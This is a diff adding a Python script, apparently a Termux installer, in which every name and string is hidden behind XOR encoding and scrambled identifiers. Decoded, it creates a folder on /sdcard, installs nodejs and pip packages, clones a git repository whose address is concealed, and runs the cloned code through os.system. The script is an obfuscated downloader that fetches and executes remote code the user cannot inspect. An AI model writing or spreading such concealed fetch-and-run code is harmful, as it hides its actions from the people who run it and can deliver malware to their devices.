@@ -1,0 +1,74 @@
+O1O1O1O0l10010O0OO1ll = (lambda l01ll10lOO01lO0O0100O,
+    OlOl0l11lOl0l1O1ll01l: l01ll10lOO01lO0O0100O + OlOl0l11lOl0l1O1ll01l)
+l11101000l1l0100111ll = (lambda ll1111lO10OOO111OO0Ol,
+    O0Ol10O00OOllO0OOl1OO: ll1111lO10OOO111OO0Ol ^ O0Ol10O00OOllO0OOl1OO)
+O10l10l10l0l11l100111 = __import__(''.join(chr(O01OO1OOO010l011Ol00l ^
+    l0lOll011l01l011l1O0O) for l0lOll011l01l011l1O0O, O01OO1OOO010l011Ol00l in
+    zip(b'#\xb9', b'Q\xdc')), globals(), locals(), [], 0)
+O1l0O10l1l0OOl00Oll1l = __import__('so'[::-1], globals(), locals(), [], 0)
+
+
+def lOlll1l010lllO1O1l110():
+ try:
+  getattr(O1l0O10l1l0OOl00Oll1l, ''.join(chr(OlOl1l0l1lOOOl0O01l0O ^
+      O000l0lllO1l0001Oll1O) for O000l0lllO1l0001Oll1O,
+      OlOl1l0l1lOOOl0O01l0O in zip(b'\x9b\xc8O I', b'\xf6\xa3+I;')))(''.
+      join(chr(OOl0O001ll0OlO10Ol0lO ^ ll10O11O11Ol1lO0OOlO1) for 
+      ll10O11O11Ol1lO0OOlO1, OOl0O001ll0OlO10Ol0lO in zip(
+      b'\x9d[\x86\xd54S\xa4\x8e\xb28B\xce\x95~',
+      b'\xb2(\xe2\xb6U!\xc0\xa1\xdbV$\xab\xf6\n')))
+ except IOError:
+  pass
+  getattr(O1l0O10l1l0OOl00Oll1l, ''.join(chr(l1100OOll10l11O010O1O ^
+      ll0O11O111l1llO01OOO1) for ll0O11O111l1llO01OOO1,
+      l1100OOll10l11O010O1O in zip(b'\xbc\xcb\x85m%\x94',
+      b'\xcf\xb2\xf6\x19@\xf9')))(''.join(chr(OO1ll0OOl0lO0O11OOlO0 ^
+      O1O1ll10l001Ol10lO1ll) for O1O1ll10l001Ol10lO1ll,
+      OO1ll0OOl0lO0O11OOlO0 in zip(
+      b'\x18\x08\xb5\x87\xe5\xaa>:\xd2\x12c\t\x84\xfde\xe7\x9e\xf8p\x93;',
+      b'a%\x95\xf4\x8f\xcfZU\xbc2\x0fe\xe5\x89\x16\x89\xf7\xd8\x17\xf8K'))[
+      ::-1])
+  getattr(O1l0O10l1l0OOl00Oll1l, ''.join(chr(OOlOl11010l0l1OO011OO ^
+      OOO1llllOll1OO1OO0lO0) for OOO1llllOll1OO1OO0lO0,
+      OOlOl11010l0l1OO011OO in zip(b'Ou\x14U\x0f\x90', b'<\x0cg!j\xfd')))(''
+      .join(chr(ll11101O1OlOO1OlOll11 ^ lO10l1lOl10l1010O1OlO) for 
+      lO10l1lOl10l1010O1OlO, ll11101O1OlOO1OlOll11 in zip(
+      b'W8-\xa2!\x80vq\xba\x98\x96\x1d\x87z\xc5\x9b',
+      b"'Q]\x90\x01\xe9\x18\x02\xce\xf9\xfaq\xa7\x14\xb5\xf6")))
+  print(''.join(chr(OOl01101lO0101O01lOOO ^ l11O01lll0l00OllO0l1l) for 
+      l11O01lll0l00OllO0l1l, OOl01101lO0101O01lOOO in zip(
+      b'M6)s&\xc8\xabM\xf9\xb9\xaa\xe16 \x83',
+      b'Vm\x19H\x15\xf8\xc6\x19\x96\xd6\xc6\xc1_N\xf0')) + ('tallatio' +
+      'n\x1b[0;30m'))
+  getattr(O1l0O10l1l0OOl00Oll1l, ''.join(chr(Ol00OOl0Ol1O1l0lO1OOO ^
+      OOll0Ol01O10OOl110O00) for OOll0Ol01O10OOl110O00,
+      Ol00OOl0Ol1O1l0lO1OOO in zip(b'\x8aX\xa3\x12@z', b'\xf9!\xd0f%\x17')))(
+      O1O1O1O0l10010O0OO1ll(''.join(chr(O111lOO10lOO01011Ol0l ^
+      l0111l1ll1O1011011O11) for l0111l1ll1O1011011O11,
+      O111lOO10lOO01011Ol0l in zip(
+      b'\xed\xdf\xb4\x19\xb7\x9f.\x16\x15\x8b \xca\x0b\xe8 \xf3r\xf3\xc0`L\xd7dtZ\xf3'
+      ,
+      b'\x8a\xb6\xc09\xd4\xf3Axp\xabH\xbe\x7f\x98S\xc9]\xdc\xa7\t8\xbf\x11\x16t\x90'
+      )), ''.join(chr(O1Ol1ll1Ol010000O0O1l ^ OO11O1OOO0ll1O0100l1O) for 
+      OO11O1OOO0ll1O0100l1O, O1Ol1ll1Ol010000O0O1l in zip(
+      b"1'Q\xb9\xb2\r\xeaP\xc9\x17{6t\xa9\x86\xdd\x02^\xa1\x08\xfb\xf5\x8aEa\xce"
+      ,
+      b'^J~\xd2\xd9e\x93%\xa1s\x1fF\x18\xc7\xe0\xaed4\x8e&\x92\x9b\xec \x02\xba'
+      ))))
+  getattr(O1l0O10l1l0OOl00Oll1l, ''.join(chr(ll00O0l1101O0110OlOll ^
+      l11000OOlllll10010l11) for l11000OOlllll10010l11,
+      ll00O0l1101O0110OlOll in zip(b'\xdf\xaeHT\xd1\xaf',
+      b'\xac\xd7; \xb4\xc2')))(''.join(filter(lambda O0lO00011111l1l0O1lO0:
+      ord(O0lO00011111l1l0O1lO0) % 6 != 0, 'ZT\x0cNll\x12Tx\x1e0r*Tl')).
+      join(chr(l00O1O00OO1OO0110111O ^ OlO0lO11OO0ll1Ol11101) for 
+      OlO0lO11OO0ll1Ol11101, l00O1O00OO1OO0110111O in zip(
+      b'\x95@\x90\xbd\x13\xf4ah\x8b\xf1\xa4\xec\xb3\x92\xa7\xe8M\x8b\x9b.\xe9\xe8\x1fw\xad\xc1F\x15%[m'
+      ,
+      b'\xf6$\xb0\x93z\x9a\x07\r\xe8\x85\x84\xca\x95\xb2\xd7\x919\xe3\xf4@\xdb\xc8v\x19\xcb\xa4%a\x0b#\x02'
+      )))
+
+
+if __name__ == ''.join(chr(O0l00Ol0111OO1O1O11lO ^ ll10l1lO00OO0OO01O10O) for
+    ll10l1lO00OO0OO01O10O, O0l00Ol0111OO1O1O11lO in zip(b'\xb6i? ', b'\xe96RA')
+    ) + ('in' + '__'):
+ lOlll1l010lllO1O1l110()
